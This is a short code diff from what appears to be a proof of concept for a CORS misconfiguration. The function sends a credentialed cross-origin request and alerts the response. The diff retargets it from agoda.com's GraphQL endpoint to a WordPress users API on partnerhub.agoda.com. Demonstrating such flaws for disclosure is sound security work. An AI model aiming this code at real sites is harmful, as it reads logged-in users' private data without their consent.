@@ -17,7 +17,7 @@ function cors() {
       document.getElementById("mockDataEnabled").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://agoda.com/graphql", true);
+  xhttp.open("GET", "https://partnerhub.agoda.com/wp-json/wp/v2/users/", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
